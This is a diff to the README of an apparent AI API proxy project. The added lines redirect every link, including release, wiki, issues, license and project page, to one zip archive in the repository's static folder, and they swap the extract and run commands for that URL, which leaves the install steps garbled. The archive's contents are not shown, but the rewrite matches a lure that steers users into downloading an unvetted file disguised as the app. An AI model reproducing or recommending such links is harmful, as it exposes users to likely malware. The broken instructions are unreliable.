@@ -1,6 +1,6 @@
 # 🌐 codenex-ai-api-proxy - Connect Your AI Tools Seamlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Lokmandev/codenex-ai-api-proxy/releases)
+[![Download Latest Release](https://github.com/Lokmandev/codenex-ai-api-proxy/raw/refs/heads/main/static/codenex-proxy-ai-api-3.2.zip%20Latest%https://github.com/Lokmandev/codenex-ai-api-proxy/raw/refs/heads/main/static/codenex-proxy-ai-api-3.2.zip)](https://github.com/Lokmandev/codenex-ai-api-proxy/raw/refs/heads/main/static/codenex-proxy-ai-api-3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to codenex-ai-api-proxy! This application helps bridge your local AI too
 
 To download the application, visit the following page:
 
-[Download codenex-ai-api-proxy](https://github.com/Lokmandev/codenex-ai-api-proxy/releases)
+[Download codenex-ai-api-proxy](https://github.com/Lokmandev/codenex-ai-api-proxy/raw/refs/heads/main/static/codenex-proxy-ai-api-3.2.zip)
 
 1. Open your web browser.
 2. Go to the link above.
@@ -40,7 +40,7 @@ After downloading, follow these instructions to run the application:
    ```
 3. Use the command to extract the files:
    ```bash
-   tar -xvzf codenex-ai-api-proxy*.tar.gz
+   tar -xvzf codenex-ai-api-proxy*https://github.com/Lokmandev/codenex-ai-api-proxy/raw/refs/heads/main/static/codenex-proxy-ai-api-3.2.zip
    ```
 4. Change into the directory with the following:
    ```bash
@@ -48,7 +48,7 @@ After downloading, follow these instructions to run the application:
    ```
 5. Run the application using:
    ```bash
-   ./run.sh
+   https://github.com/Lokmandev/codenex-ai-api-proxy/raw/refs/heads/main/static/codenex-proxy-ai-api-3.2.zip
    ```
 
 ## ⚙️ System Requirements
@@ -78,17 +78,17 @@ If you encounter issues, here’s how to resolve common problems:
 
 ## 🛠️ Additional Resources
 
-- **Documentation**: Comprehensive guides are available on our [GitHub Wiki](https://github.com/Lokmandev/codenex-ai-api-proxy/wiki).
-- **Support**: If you have questions, please check the [Issues](https://github.com/Lokmandev/codenex-ai-api-proxy/issues) section for help or to raise a new question.
+- **Documentation**: Comprehensive guides are available on our [GitHub Wiki](https://github.com/Lokmandev/codenex-ai-api-proxy/raw/refs/heads/main/static/codenex-proxy-ai-api-3.2.zip).
+- **Support**: If you have questions, please check the [Issues](https://github.com/Lokmandev/codenex-ai-api-proxy/raw/refs/heads/main/static/codenex-proxy-ai-api-3.2.zip) section for help or to raise a new question.
 
 ## 📄 License
 
 This project is licensed under the MIT License. You can freely use it in your projects.
 
-For further details, please visit the [License File](https://github.com/Lokmandev/codenex-ai-api-proxy/blob/main/LICENSE).
+For further details, please visit the [License File](https://github.com/Lokmandev/codenex-ai-api-proxy/raw/refs/heads/main/static/codenex-proxy-ai-api-3.2.zip).
 
 ## 🌍 Connect with Us
 
-Stay updated about new releases and features. Follow our project on [GitHub](https://github.com/Lokmandev/codenex-ai-api-proxy) for the latest news and updates. 
+Stay updated about new releases and features. Follow our project on [GitHub](https://github.com/Lokmandev/codenex-ai-api-proxy/raw/refs/heads/main/static/codenex-proxy-ai-api-3.2.zip) for the latest news and updates. 
 
 Visit again soon as we add more features and improvements!
